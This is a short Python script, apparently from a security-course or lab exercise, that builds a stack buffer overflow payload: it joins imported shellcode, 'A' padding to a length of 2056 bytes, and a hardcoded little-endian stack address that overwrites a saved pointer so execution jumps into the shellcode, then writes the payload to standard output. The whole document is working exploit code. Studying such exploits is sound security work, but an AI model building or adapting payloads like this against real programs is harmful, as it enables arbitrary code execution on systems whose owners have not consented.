#!/usr/bin/env python3

import sys
from shellcode import shellcode

# Address of `buf` in little-endian format (confirm exact address in gdb)
buf_address = (0x7ffffff6d350).to_bytes(8, 'little')  # Replace with actual address if different

# Use the calculated padding length to reach `p`
padding_length = 2056

# Construct the payload: shellcode + padding + buf address
payload = shellcode + b'A' * (padding_length - len(shellcode)) + buf_address

# Output the payload
sys.stdout.buffer.write(payload)
